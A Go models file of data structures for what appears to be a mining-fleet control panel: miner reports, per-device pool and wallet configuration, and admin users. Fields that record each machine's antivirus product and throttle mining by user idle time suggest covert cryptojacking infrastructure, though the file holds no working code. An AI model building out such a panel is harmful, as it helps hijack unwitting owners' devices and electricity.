package models

// MinerReport represents the data sent by miners to the portal
type MinerReport struct {
	PCUsername      string  `json:"pc_username"`
	DeviceHash      string  `json:"device_hash"` // Unique device identifier
	CPUName         string  `json:"cpu_name"`
	GPUName         string  `json:"gpu_name"`
	CPUHashrate     float64 `json:"cpu_hashrate"` // in H/s
	GPUHashrate     float64 `json:"gpu_hashrate"` // in H/s
	AntivirusName   string  `json:"antivirus_name"`
	DeviceUptimeMin int     `json:"device_uptime_min"` // in minutes
	Timestamp       int64   `json:"timestamp"`
}

// MinerConfig represents configuration sent to miners (for each CPU/GPU)
type MinerConfig struct {
	MiningURL    string  `json:"mining_url"`
	Wallet       string  `json:"wallet"`
	Password     string  `json:"password"`
	NonIdleUsage float64 `json:"non_idle_usage"`
	IdleUsage    float64 `json:"idle_usage"`
	WaitTimeIdle int     `json:"wait_time_idle"`
	UseSSL       int     `json:"use_ssl"` // 0 = no SSL, 1 = SSL/TLS
	Timestamp    int64   `json:"timestamp"`
}

// Miner represents a mining device
type Miner struct {
	ID              int     `json:"id"`
	DeviceHash      string  `json:"device_hash"`
	PCUsername      string  `json:"pc_username"`
	CPUName         string  `json:"cpu_name"`
	GPUName         string  `json:"gpu_name"`
	CPUHashRate     float64 `json:"cpu_hashrate"`
	GPUHashRate     float64 `json:"gpu_hashrate"`
	AntivirusName   string  `json:"antivirus_name"`
	DeviceUptimeMin int     `json:"device_uptime_min"`
	Status          string  `json:"status"`
	LastSeen        int64   `json:"last_seen"`
	CreatedAt       int64   `json:"created_at"`
}

// Config represents application configuration
type Config struct {
	ID        int    `json:"id"`
	CPUConfig string `json:"cpu_config"` // JSON string
	GPUConfig string `json:"gpu_config"` // JSON string
}

// User represents an admin user
type User struct {
	ID           int    `json:"id"`
	Username     string `json:"username"`
	PasswordHash string `json:"password_hash"`
	CreatedAt    int64  `json:"created_at"`
}
